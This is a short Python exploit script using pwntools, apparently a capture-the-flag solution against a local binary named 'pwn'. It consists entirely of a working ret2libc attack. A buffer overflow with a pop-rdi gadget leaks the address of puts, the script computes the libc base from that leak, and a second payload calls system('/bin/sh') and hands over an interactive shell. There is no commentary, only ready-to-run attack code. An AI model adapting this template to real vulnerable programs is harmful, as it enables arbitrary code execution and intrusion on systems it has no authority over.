# EXP
```python
from pwnlib.util.packing import u64
from pwnlib.util.packing import u32
from pwnlib.util.packing import u16
from pwnlib.util.packing import u8
from pwnlib.util.packing import p64
from pwnlib.util.packing import p32
from pwnlib.util.packing import p16
from pwnlib.util.packing import p8
from pwn import *
from ctypes import *

context(os='linux', arch='amd64', log_level='debug')
p = process("/home/zp9080/PWN/pwn")
elf = ELF("/home/zp9080/PWN/pwn")
libc=elf.libc 

gdb_script='''
b *0x4011EE
'''

def dbg():
    gdb.attach(p,gdb_script)
    pause()

# dbg()
main=0x4011F0 
puts_addr=elf.plt['puts']
puts_got=elf.got['puts']
pop_rdi=0x4011C5 
p.sendafter("Hello Hacker!\n",b'a'*0x58+p64(pop_rdi)+p64(puts_got)+p64(puts_addr)+p64(main))
libcbase=u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))-libc.symbols['puts']
print(hex(libcbase))

ret=0x4011C7
system_addr = libcbase + libc.symbols['system']
bin_addr = libcbase + next(libc.search(b'/bin/sh'))
# dbg()
p.sendafter("Hello Hacker!\n",b'a'*0x58+p64(pop_rdi)+p64(bin_addr)+p64(ret)+p64(system_addr))

p.interactive()
```